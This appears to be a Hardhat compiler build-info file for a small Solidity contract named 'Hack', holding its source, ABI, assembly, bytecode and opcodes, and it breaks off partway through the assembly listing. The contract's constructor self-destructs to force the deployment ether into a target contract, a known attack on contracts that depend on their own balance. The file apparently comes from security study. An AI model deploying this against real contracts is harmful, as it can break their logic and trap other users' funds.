{
	"id": "5e1af8a411e21f8121ec8f8ea75a34ea",
	"_format": "hh-sol-build-info-1",
	"solcVersion": "0.8.0",
	"solcLongVersion": "0.8.0+commit.c7dfd78e",
	"input": {
		"language": "Solidity",
		"sources": {
			"Contracts/Hack.sol": {
				"content": "// SPDX-License-Identifier: MIT\r\npragma solidity ^0.8.0;\r\n\r\ncontract Hack{\r\n    constructor(address payable _target) payable{\r\n        selfdestruct(_target);\r\n    }\r\n    function getBalance() external view returns(uint){\r\n        return address(this).balance;\r\n    }\r\n}"
			}
		},
		"settings": {
			"optimizer": {
				"enabled": false,
				"runs": 200
			},
			"outputSelection": {
				"*": {
					"": [
						"ast"
					],
					"*": [
						"abi",
						"metadata",
						"devdoc",
						"userdoc",
						"storageLayout",
						"evm.legacyAssembly",
						"evm.bytecode",
						"evm.deployedBytecode",
						"evm.methodIdentifiers",
						"evm.gasEstimates",
						"evm.assembly"
					]
				}
			}
		}
	},
	"output": {
		"contracts": {
			"Contracts/Hack.sol": {
				"Hack": {
					"abi": [
						{
							"inputs": [
								{
									"internalType": "address payable",
									"name": "_target",
									"type": "address"
								}
							],
							"stateMutability": "payable",
							"type": "constructor"
						},
						{
							"inputs": [],
							"name": "getBalance",
							"outputs": [
								{
									"internalType": "uint256",
									"name": "",
									"type": "uint256"
								}
							],
							"stateMutability": "view",
							"type": "function"
						}
					],
					"devdoc": {
						"kind": "dev",
						"methods": {},
						"version": 1
					},
					"evm": {
						"assembly": "    /* \"Contracts/Hack.sol\":60:269  contract Hack{\r... */\n  mstore(0x40, 0x80)\n    /* \"Contracts/Hack.sol\":80:164  constructor(address payable _target) payable{\r... */\n  mload(0x40)\n  sub(codesize, bytecodeSize)\n  dup1\n  bytecodeSize\n  dup4\n  codecopy\n  dup2\n  dup2\n  add\n  0x40\n  mstore\n  dup2\n  add\n  swap1\n  tag_1\n  swap2\n  swap1\n  tag_2\n  jump\t// in\ntag_1:\n    /* \"Contracts/Hack.sol\":148:155  _target */\n  dup1\n    /* \"Contracts/Hack.sol\":135:156  selfdestruct(_target) */\n  0xffffffffffffffffffffffffffffffffffffffff\n  and\n  selfdestruct\n    /* \"#utility.yul\":7:166   */\ntag_7:\n  0x00\n    /* \"#utility.yul\":103:109   */\n  dup2\n    /* \"#utility.yul\":97:110   */\n  mload\n    /* \"#utility.yul\":88:110   */\n  swap1\n  pop\n    /* \"#utility.yul\":119:160   */\n  tag_9\n    /* \"#utility.yul\":154:159   */\n  dup2\n    /* \"#utility.yul\":119:160   */\n  tag_10\n  jump\t// in\ntag_9:\n    /* \"#utility.yul\":78:166   */\n  swap3\n  swap2\n  pop\n  pop\n  jump\t// out\n    /* \"#utility.yul\":172:472   */\ntag_2:\n  0x00\n    /* \"#utility.yul\":299:301   */\n  0x20\n    /* \"#utility.yul\":287:296   */\n  dup3\n    /* \"#utility.yul\":278:285   */\n  dup5\n    /* \"#utility.yul\":274:297   */\n  sub\n    /* \"#utility.yul\":270:302   */\n  slt\n    /* \"#utility.yul\":267:269   */\n  iszero\n  tag_12\n  jumpi\n    /* \"#utility.yul\":315:316   */\n  0x00\n    /* \"#utility.yul\":312:313   */\n  dup1\n    /* \"#utility.yul\":305:317   */\n  revert\n    /* \"#utility.yul\":267:269   */\ntag_12:\n    /* \"#utility.yul\":358:359   */\n  0x00\n    /* \"#utility.yul\":383:455   */\n  tag_13\n    /* \"#utility.yul\":447:454   */\n  dup5\n    /* \"#utility.yul\":438:444   */\n  dup3\n    /* \"#utility.yul\":427:436   */\n  dup6\n    /* \"#utility.yul\":423:445   */\n  add\n    /* \"#utility.yul\":383:455   */\n  tag_7\n  jump\t// in\ntag_13:\n    /* \"#utility.yul\":373:455   */\n  swap2\n  pop\n    /* \"#utility.yul\":329:465   */\n  pop\n    /* \"#utility.yul\":257:472   */\n  swap3\n  swap2\n  pop\n  pop\n  jump\t// out\n    /* \"#utility.yul\":478:582   */\ntag_14:\n  0x00\n    /* \"#utility.yul\":552:576   */\n  tag_16\n    /* \"#utility.yul\":570:575   */\n  dup3\n    /* \"#utility.yul\":552:576   */\n  tag_17\n  jump\t// in\ntag_16:\n    /* \"#utility.yul\":541:576   */\n  swap1\n  pop\n    /* \"#utility.yul\":531:582   */\n  swap2\n  swap1\n  pop\n  jump\t// out\n    /* \"#utility.yul\":588:714   */\ntag_17:\n  0x00\n    /* \"#utility.yul\":665:707   */\n  0xffffffffffffffffffffffffffffffffffffffff\n    /* \"#utility.yul\":658:663   */\n  dup3\n    /* \"#utility.yul\":654:708   */\n  and\n    /* \"#utility.yul\":643:708   */\n  swap1\n  pop\n    /* \"#utility.yul\":633:714   */\n  swap2\n  swap1\n  pop\n  jump\t// out\n    /* \"#utility.yul\":720:858   */\ntag_10:\n    /* \"#utility.yul\":801:833   */\n  tag_20\n    /* \"#utility.yul\":827:832   */\n  dup2\n    /* \"#utility.yul\":801:833   */\n  tag_14\n  jump\t// in\ntag_20:\n    /* \"#utility.yul\":794:799   */\n  dup2\n    /* \"#utility.yul\":791:834   */\n  eq\n    /* \"#utility.yul\":781:783   */\n  tag_21\n  jumpi\n    /* \"#utility.yul\":848:849   */\n  0x00\n    /* \"#utility.yul\":845:846   */\n  dup1\n    /* \"#utility.yul\":838:850   */\n  revert\n    /* \"#utility.yul\":781:783   */\ntag_21:\n    /* \"#utility.yul\":771:858   */\n  pop\n  jump\t// out\nstop\n\nsub_0: assembly {\n        /* \"Contracts/Hack.sol\":60:269  contract Hack{\r... */\n      mstore(0x40, 0x80)\n      callvalue\n      dup1\n      iszero\n      tag_1\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_1:\n      pop\n      jumpi(tag_2, lt(calldatasize, 0x04))\n      shr(0xe0, calldataload(0x00))\n      dup1\n      0x12065fe0\n      eq\n      tag_3\n      jumpi\n    tag_2:\n      0x00\n      dup1\n      revert\n        /* \"Contracts/Hack.sol\":170:266  function getBalance() external view returns(uint){\r... */\n    tag_3:\n      tag_4\n      tag_5\n      jump\t// in\n    tag_4:\n      mload(0x40)\n      tag_6\n      swap2\n      swap1\n      tag_7\n      jump\t// in\n    tag_6:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n    tag_5:\n        /* \"Contracts/Hack.sol\":214:218  uint */\n      0x00\n        /* \"Contracts/Hack.sol\":237:258  address(this).balance */\n      selfbalance\n        /* \"Contracts/Hack.sol\":230:258  return address(this).balance */\n      swap1\n      pop\n        /* \"Contracts/Hack.sol\":170:266  function getBalance() external view returns(uint){\r... */\n      swap1\n      jump\t// out\n        /* \"#utility.yul\":7:125   */\n    tag_10:\n        /* \"#utility.yul\":94:118   */\n      tag_12\n        /* \"#utility.yul\":112:117   */\n      dup2\n        /* \"#utility.yul\":94:118   */\n      tag_13\n      jump\t// in\n    tag_12:\n        /* \"#utility.yul\":89:92   */\n      dup3\n        /* \"#utility.yul\":82:119   */\n      mstore\n        /* \"#utility.yul\":72:125   */\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":131:353   */\n    tag_7:\n      0x00\n        /* \"#utility.yul\":262:264   */\n      0x20\n        /* \"#utility.yul\":251:260   */\n      dup3\n        /* \"#utility.yul\":247:265   */\n      add\n        /* \"#utility.yul\":239:265   */\n      swap1\n      pop\n        /* \"#utility.yul\":275:346   */\n      tag_15\n        /* \"#utility.yul\":343:344   */\n      0x00\n        /* \"#utility.yul\":332:341   */\n      dup4\n        /* \"#utility.yul\":328:345   */\n      add\n        /* \"#utility.yul\":319:325   */\n      dup5\n        /* \"#utility.yul\":275:346   */\n      tag_10\n      jump\t// in\n    tag_15:\n        /* \"#utility.yul\":229:353   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":359:436   */\n    tag_13:\n      0x00\n        /* \"#utility.yul\":425:430   */\n      dup2\n        /* \"#utility.yul\":414:430   */\n      swap1\n      pop\n        /* \"#utility.yul\":404:436   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n\n    auxdata: 0xa2646970667358221220bae0b30163b15275136bd4a17b53cfefd13f6c03d49d08c301de4764404bb5ff64736f6c63430008000033\n}\n",
						"bytecode": {
							"generatedSources": [
								{
									"ast": {
										"nodeType": "YulBlock",
										"src": "0:861:1",
										"statements": [
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "78:88:1",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "88:22:1",
															"value": {
																"arguments": [
																	{
																		"name": "offset",
																		"nodeType": "YulIdentifier",
																		"src": "103:6:1"
																	}
																],
																"functionName": {
																	"name": "mload",
																	"nodeType": "YulIdentifier",
																	"src": "97:5:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "97:13:1"
															},
															"variableNames": [
																{
																	"name": "value",
																	"nodeType": "YulIdentifier",
																	"src": "88:5:1"
																}
															]
														},
														{
															"expression": {
																"arguments": [
																	{
																		"name": "value",
																		"nodeType": "YulIdentifier",
																		"src": "154:5:1"
																	}
																],
																"functionName": {
																	"name": "validator_revert_t_address_payable",
																	"nodeType": "YulIdentifier",
																	"src": "119:34:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "119:41:1"
															},
															"nodeType": "YulExpressionStatement",
															"src": "119:41:1"
														}
													]
												},
												"name": "abi_decode_t_address_payable_fromMemory",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "offset",
														"nodeType": "YulTypedName",
														"src": "56:6:1",
														"type": ""
													},
													{
														"name": "end",
														"nodeType": "YulTypedName",
														"src": "64:3:1",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "value",
														"nodeType": "YulTypedName",
														"src": "72:5:1",
														"type": ""
													}
												],
												"src": "7:159:1"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "257:215:1",
													"statements": [
														{
															"body": {
																"nodeType": "YulBlock",
																"src": "303:16:1",
																"statements": [
																	{
																		"expression": {
																			"arguments": [
																				{
																					"kind": "number",
																					"nodeType": "YulLiteral",
																					"src": "312:1:1",
																					"type": "",
																					"value": "0"
																				},
																				{
																					"kind": "number",
																					"nodeType": "YulLiteral",
																					"src": "315:1:1",
																					"type": "",
																					"value": "0"
																				}
																			],
																			"functionName": {
																				"name": "revert",
																				"nodeType": "YulIdentifier",
																				"src": "305:6:1"
																			},
																			"nodeType": "YulFunctionCall",
																			"src": "305:12:1"
																		},
																		"nodeType": "YulExpressionStatement",
																		"src": "305:12:1"
																	}
																]
															},
															"condition": {
																"arguments": [
																	{
																		"arguments": [
																			{
																				"name": "dataEnd",
																				"nodeType": "YulIdentifier",
																				"src": "278:7:1"
																			},
																			{
																				"name": "headStart",
																				"nodeType": "YulIdentifier",
																				"src": "287:9:1"
																			}
																		],
																		"functionName": {
																			"name": "sub",
																			"nodeType": "YulIdentifier",
																			"src": "274:3:1"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "274:23:1"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "299:2:1",
																		"type": "",
																		"value": "32"
																	}
																],
																"functionName": {
																	"name": "slt",
																	"nodeType": "YulIdentifier",
																	"src": "270:3:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "270:32:1"
															},
															"nodeType": "YulIf",
															"src": "267:2:1"
														},
														{
															"nodeType": "YulBlock",
															"src": "329:136:1",
															"statements": [
																{
																	"nodeType": "YulVariableDeclaration",
																	"src": "344:15:1",
																	"value": {
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "358:1:1",
																		"type": "",
																		"value": "0"
																	},
																	"variables": [
																		{
																			"name": "offset",
																			"nodeType": "YulTypedName",
																			"src": "348:6:1",
																			"type": ""
																		}
																	]
																},
																{
																	"nodeType": "YulAssignment",
																	"src": "373:82:1",
																	"value": {
																		"arguments": [
																			{
																				"arguments": [
																					{
																						"name": "headStart",
																						"nodeType": "YulIdentifier",
																						"src": "427:9:1"
																					},
																					{
																						"name": "offset",
																						"nodeType": "YulIdentifier",
																						"src": "438:6:1"
																					}
																				],
																				"functionName": {
																					"name": "add",
																					"nodeType": "YulIdentifier",
																					"src": "423:3:1"
																				},
																				"nodeType": "YulFunctionCall",
																				"src": "423:22:1"
																			},
																			{
																				"name": "dataEnd",
																				"nodeType": "YulIdentifier",
																				"src": "447:7:1"
																			}
																		],
																		"functionName": {
																			"name": "abi_decode_t_address_payable_fromMemory",
																			"nodeType": "YulIdentifier",
																			"src": "383:39:1"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "383:72:1"
																	},
																	"variableNames": [
																		{
																			"name": "value0",
																			"nodeType": "YulIdentifier",
																			"src": "373:6:1"
																		}
																	]
																}
															]
														}
													]
												},
												"name": "abi_decode_tuple_t_address_payable_fromMemory",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "headStart",
														"nodeType": "YulTypedName",
														"src": "227:9:1",
														"type": ""
													},
													{
														"name": "dataEnd",
														"nodeType": "YulTypedName",
														"src": "238:7:1",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "value0",
														"nodeType": "YulTypedName",
														"src": "250:6:1",
														"type": ""
													}
												],
												"src": "172:300:1"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "531:51:1",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "541:35:1",
															"value": {
																"arguments": [
																	{
																		"name": "value",
																		"nodeType": "YulIdentifier",
																		"src": "570:5:1"
																	}
																],
																"functionName": {
																	"name": "cleanup_t_uint160",
																	"nodeType": "YulIdentifier",
																	"src": "552:17:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "552:24:1"
															},
															"variableNames": [
																{
																	"name": "cleaned",
																	"nodeType": "YulIdentifier",
																	"src": "541:7:1"
																}
															]
														}
													]
												},
												"name": "cleanup_t_address_payable",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nodeType": "YulTypedName",
														"src": "513:5:1",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "cleaned",
														"nodeType": "YulTypedName",
														"src": "523:7:1",
														"type": ""
													}
												],
												"src": "478:104:1"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "633:81:1",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "643:65:1",
															"value": {
																"arguments": [
																	{
																		"name": "value",
																		"nodeType": "YulIdentifier",
																		"src": "658:5:1"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "665:42:1",
																		"type": "",
																		"value": "0xffffffffffffffffffffffffffffffffffffffff"
																	}
																],
																"functionName": {
																	"name": "and",
																	"nodeType": "YulIdentifier",
																	"src": "654:3:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "654:54:1"
															},
															"variableNames": [
																{
																	"name": "cleaned",
																	"nodeType": "YulIdentifier",
																	"src": "643:7:1"
																}
															]
														}
													]
												},
												"name": "cleanup_t_uint160",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nodeType": "YulTypedName",
														"src": "615:5:1",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "cleaned",
														"nodeType": "YulTypedName",
														"src": "625:7:1",
														"type": ""
													}
												],
												"src": "588:126:1"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "771:87:1",
													"statements": [
														{
															"body": {
																"nodeType": "YulBlock",
																"src": "836:16:1",
																"statements": [
																	{
																		"expression": {
																			"arguments": [
																				{
																					"kind": "number",
																					"nodeType": "YulLiteral",
																					"src": "845:1:1",
																					"type": "",
																					"value": "0"
																				},
																				{
																					"kind": "number",
																					"nodeType": "YulLiteral",
																					"src": "848:1:1",
																					"type": "",
																					"value": "0"
																				}
																			],
																			"functionName": {
																				"name": "revert",
																				"nodeType": "YulIdentifier",
																				"src": "838:6:1"
																			},
																			"nodeType": "YulFunctionCall",
																			"src": "838:12:1"
																		},
																		"nodeType": "YulExpressionStatement",
																		"src": "838:12:1"
																	}
																]
															},
															"condition": {
																"arguments": [
																	{
																		"arguments": [
																			{
																				"name": "value",
																				"nodeType": "YulIdentifier",
																				"src": "794:5:1"
																			},
																			{
																				"arguments": [
																					{
																						"name": "value",
																						"nodeType": "YulIdentifier",
																						"src": "827:5:1"
																					}
																				],
																				"functionName": {
																					"name": "cleanup_t_address_payable",
																					"nodeType": "YulIdentifier",
																					"src": "801:25:1"
																				},
																				"nodeType": "YulFunctionCall",
																				"src": "801:32:1"
																			}
																		],
																		"functionName": {
																			"name": "eq",
																			"nodeType": "YulIdentifier",
																			"src": "791:2:1"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "791:43:1"
																	}
																],
																"functionName": {
																	"name": "iszero",
																	"nodeType": "YulIdentifier",
																	"src": "784:6:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "784:51:1"
															},
															"nodeType": "YulIf",
															"src": "781:2:1"
														}
													]
												},
												"name": "validator_revert_t_address_payable",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nodeType": "YulTypedName",
														"src": "764:5:1",
														"type": ""
													}
												],
												"src": "720:138:1"
											}
										]
									},
									"contents": "{\n\n    function abi_decode_t_address_payable_fromMemory(offset, end) -> value {\n        value := mload(offset)\n        validator_revert_t_address_payable(value)\n    }\n\n    function abi_decode_tuple_t_address_payable_fromMemory(headStart, dataEnd) -> value0 {\n        if slt(sub(dataEnd, headStart), 32) { revert(0, 0) }\n\n        {\n\n            let offset := 0\n\n            value0 := abi_decode_t_address_payable_fromMemory(add(headStart, offset), dataEnd)\n        }\n\n    }\n\n    function cleanup_t_address_payable(value) -> cleaned {\n        cleaned := cleanup_t_uint160(value)\n    }\n\n    function cleanup_t_uint160(value) -> cleaned {\n        cleaned := and(value, 0xffffffffffffffffffffffffffffffffffffffff)\n    }\n\n    function validator_revert_t_address_payable(value) {\n        if iszero(eq(value, cleanup_t_address_payable(value))) { revert(0, 0) }\n    }\n\n}\n",
									"id": 1,
									"language": "Yul",
									"name": "#utility.yul"
								}
							],
							"linkReferences": {},
							"object": "60806040526040516100c63803806100c683398181016040528101906100259190610053565b8073ffffffffffffffffffffffffffffffffffffffff16ff5b60008151905061004d816100ae565b92915050565b60006020828403121561006557600080fd5b60006100738482850161003e565b91505092915050565b60006100878261008e565b9050919050565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b6100b78161007c565b81146100c257600080fd5b5056fe",
							"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x40 MLOAD PUSH2 0xC6 CODESIZE SUB DUP1 PUSH2 0xC6 DUP4 CODECOPY DUP2 DUP2 ADD PUSH1 0x40 MSTORE DUP2 ADD SWAP1 PUSH2 0x25 SWAP2 SWAP1 PUSH2 0x53 JUMP JUMPDEST DUP1 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SELFDESTRUCT JUMPDEST PUSH1 0x0 DUP2 MLOAD SWAP1 POP PUSH2 0x4D DUP2 PUSH2 0xAE JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0x65 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x0 PUSH2 0x73 DUP5 DUP3 DUP6 ADD PUSH2 0x3E JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x87 DUP3 PUSH2 0x8E JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0xB7 DUP2 PUSH2 0x7C JUMP JUMPDEST DUP2 EQ PUSH2 0xC2 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP JUMP INVALID ",
							"sourceMap": "60:209:0:-:0;;;80:84;;;;;;;;;;;;;;;;;;;;;:::i;:::-;148:7;135:21;;;7:159:1;;103:6;97:13;88:22;;119:41;154:5;119:41;:::i;:::-;78:88;;;;:::o;172:300::-;;299:2;287:9;278:7;274:23;270:32;267:2;;;315:1;312;305:12;267:2;358:1;383:72;447:7;438:6;427:9;423:22;383:72;:::i;:::-;373:82;;329:136;257:215;;;;:::o;478:104::-;;552:24;570:5;552:24;:::i;:::-;541:35;;531:51;;;:::o;588:126::-;;665:42;658:5;654:54;643:65;;633:81;;;:::o;720:138::-;801:32;827:5;801:32;:::i;:::-;794:5;791:43;781:2;;848:1;845;838:12;781:2;771:87;:::o"
						},
						"deployedBytecode": {
							"generatedSources": [
								{
									"ast": {
										"nodeType": "YulBlock",
										"src": "0:439:1",
										"statements": [
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "72:53:1",
													"statements": [
														{
															"expression": {
																"arguments": [
																	{
																		"name": "pos",
																		"nodeType": "YulIdentifier",
																		"src": "89:3:1"
																	},
																	{
																		"arguments": [
																			{
																				"name": "value",
																				"nodeType": "YulIdentifier",
																				"src": "112:5:1"
																			}
																		],
																		"functionName": {
																			"name": "cleanup_t_uint256",
																			"nodeType": "YulIdentifier",
																			"src": "94:17:1"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "94:24:1"
																	}
																],
																"functionName": {
																	"name": "mstore",
																	"nodeType": "YulIdentifier",
																	"src": "82:6:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "82:37:1"
															},
															"nodeType": "YulExpressionStatement",
															"src": "82:37:1"
														}
													]
												},
												"name": "abi_encode_t_uint256_to_t_uint256_fromStack",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nodeType": "YulTypedName",
														"src": "60:5:1",
														"type": ""
													},
													{
														"name": "pos",
														"nodeType": "YulTypedName",
														"src": "67:3:1",
														"type": ""
													}
												],
												"src": "7:118:1"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "229:124:1",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "239:26:1",
															"value": {
																"arguments": [
																	{
																		"name": "headStart",
																		"nodeType": "YulIdentifier",
																		"src": "251:9:1"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "262:2:1",
																		"type": "",
																		"value": "32"
																	}
																],
																"functionName": {
																	"name": "add",
																	"nodeType": "YulIdentifier",
																	"src": "247:3:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "247:18:1"
															},
															"variableNames": [
																{
																	"name": "tail",
																	"nodeType": "YulIdentifier",
																	"src": "239:4:1"
																}
															]
														},
														{
															"expression": {
																"arguments": [
																	{
																		"name": "value0",
																		"nodeType": "YulIdentifier",
																		"src": "319:6:1"
																	},
																	{
																		"arguments": [
																			{
																				"name": "headStart",
																				"nodeType": "YulIdentifier",
																				"src": "332:9:1"
																			},
																			{
																				"kind": "number",
																				"nodeType": "YulLiteral",
																				"src": "343:1:1",
																				"type": "",
																				"value": "0"
																			}
																		],
																		"functionName": {
																			"name": "add",
																			"nodeType": "YulIdentifier",
																			"src": "328:3:1"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "328:17:1"
																	}
																],
																"functionName": {
																	"name": "abi_encode_t_uint256_to_t_uint256_fromStack",
																	"nodeType": "YulIdentifier",
																	"src": "275:43:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "275:71:1"
															},
															"nodeType": "YulExpressionStatement",
															"src": "275:71:1"
														}
													]
												},
												"name": "abi_encode_tuple_t_uint256__to_t_uint256__fromStack_reversed",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "headStart",
														"nodeType": "YulTypedName",
														"src": "201:9:1",
														"type": ""
													},
													{
														"name": "value0",
														"nodeType": "YulTypedName",
														"src": "213:6:1",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "tail",
														"nodeType": "YulTypedName",
														"src": "224:4:1",
														"type": ""
													}
												],
												"src": "131:222:1"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "404:32:1",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "414:16:1",
															"value": {
																"name": "value",
																"nodeType": "YulIdentifier",
																"src": "425:5:1"
															},
															"variableNames": [
																{
																	"name": "cleaned",
																	"nodeType": "YulIdentifier",
																	"src": "414:7:1"
																}
															]
														}
													]
												},
												"name": "cleanup_t_uint256",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nodeType": "YulTypedName",
														"src": "386:5:1",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "cleaned",
														"nodeType": "YulTypedName",
														"src": "396:7:1",
														"type": ""
													}
												],
												"src": "359:77:1"
											}
										]
									},
									"contents": "{\n\n    function abi_encode_t_uint256_to_t_uint256_fromStack(value, pos) {\n        mstore(pos, cleanup_t_uint256(value))\n    }\n\n    function abi_encode_tuple_t_uint256__to_t_uint256__fromStack_reversed(headStart , value0) -> tail {\n        tail := add(headStart, 32)\n\n        abi_encode_t_uint256_to_t_uint256_fromStack(value0,  add(headStart, 0))\n\n    }\n\n    function cleanup_t_uint256(value) -> cleaned {\n        cleaned := value\n    }\n\n}\n",
									"id": 1,
									"language": "Yul",
									"name": "#utility.yul"
								}
							],
							"immutableReferences": {},
							"linkReferences": {},
							"object": "6080604052348015600f57600080fd5b506004361060285760003560e01c806312065fe014602d575b600080fd5b60336047565b604051603e9190605c565b60405180910390f35b600047905090565b6056816075565b82525050565b6000602082019050606f6000830184604f565b92915050565b600081905091905056fea2646970667358221220bae0b30163b15275136bd4a17b53cfefd13f6c03d49d08c301de4764404bb5ff64736f6c63430008000033",
							"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH1 0xF JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x4 CALLDATASIZE LT PUSH1 0x28 JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x12065FE0 EQ PUSH1 0x2D JUMPI JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x33 PUSH1 0x47 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH1 0x3E SWAP2 SWAP1 PUSH1 0x5C JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH1 0x0 SELFBALANCE SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x56 DUP2 PUSH1 0x75 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH1 0x6F PUSH1 0x0 DUP4 ADD DUP5 PUSH1 0x4F JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 0xBA 0xE0 0xB3 ADD PUSH4 0xB1527513 PUSH12 0xD4A17B53CFEFD13F6C03D49D ADDMOD 0xC3 ADD 0xDE SELFBALANCE PUSH5 0x404BB5FF64 PUSH20 0x6F6C634300080000330000000000000000000000 ",
							"sourceMap": "60:209:0:-:0;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;170:96;;;:::i;:::-;;;;;;;:::i;:::-;;;;;;;;;214:4;237:21;230:28;;170:96;:::o;7:118:1:-;94:24;112:5;94:24;:::i;:::-;89:3;82:37;72:53;;:::o;131:222::-;;262:2;251:9;247:18;239:26;;275:71;343:1;332:9;328:17;319:6;275:71;:::i;:::-;229:124;;;;:::o;359:77::-;;425:5;414:16;;404:32;;;:::o"
						},
						"gasEstimates": {
							"creation": {
								"codeDepositCost": "36200",
								"executionCost": "infinite",
								"totalCost": "infinite"
							},
							"external": {
								"getBalance()": "317"
							}
						},
						"legacyAssembly": {
							".code": [
								{
									"begin": 60,
									"end": 269,
									"name": "PUSH",
									"source": 0,
									"value": "80"
								},
								{
									"begin": 60,
									"end": 269,
									"name": "PUSH",
									"source": 0,
									"value": "40"
								},
								{
									"begin": 60,
									"end": 269,
									"name": "MSTORE",
									"source": 0
								},
								{
									"begin": 80,
									"end": 164,
									"name": "PUSH",
									"source": 0,
									"value": "40"
								},
								{
									"begin": 80,
									"end": 164,
									"name": "MLOAD",
									"source": 0
								},
								{
									"begin": 80,
									"end": 164,
									"name": "PUSHSIZE",
									"source": 0
								},
								{
									"begin": 80,
									"end": 164,
									"name": "CODESIZE",
									"source": 0
								},
								{
									"begin": 80,
									"end": 164,
									"name": "SUB",
									"source": 0
								},
								{
									"begin": 80,
									"end": 164,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 80,
									"end": 164,
									"name": "PUSHSIZE",
									"source": 0
								},
								{
									"begin": 80,
									"end": 164,
									"name": "DUP4",
									"source": 0
								},
								{
									"begin": 80,
									"end": 164,
									"name": "CODECOPY",
									"source": 0
								},
								{
									"begin": 80,
									"end": 164,
									"name": "DUP2",
									"source": 0
								},
								{
									"begin": 80,
									"end": 164,
									"name": "DUP2",
									"source": 0
								},
								{
									"begin": 80,
									"end": 164,
									"name": "ADD",
									"source": 0
								},
								{
									"begin": 80,
									"end": 164,
									"name": "PUSH",
									"source": 0,
									"value": "40"
								},
								{
									"begin": 80,
									"end": 164,
									"name": "MSTORE",
									"source": 0
								},
								{
									"begin": 80,
									"end": 164,
									"name": "DUP2",
									"source": 0
								},
								{
									"begin": 80,
									"end": 164,
									"name": "ADD",
									"source": 0
								},
								{
									"begin": 80,
									"end": 164,
									"name": "SWAP1",
									"source": 0
								},
								{
									"begin": 80,
									"end": 164,
									"name": "PUSH [tag]",
									"source": 0,
									"value": "1"
								},
								{
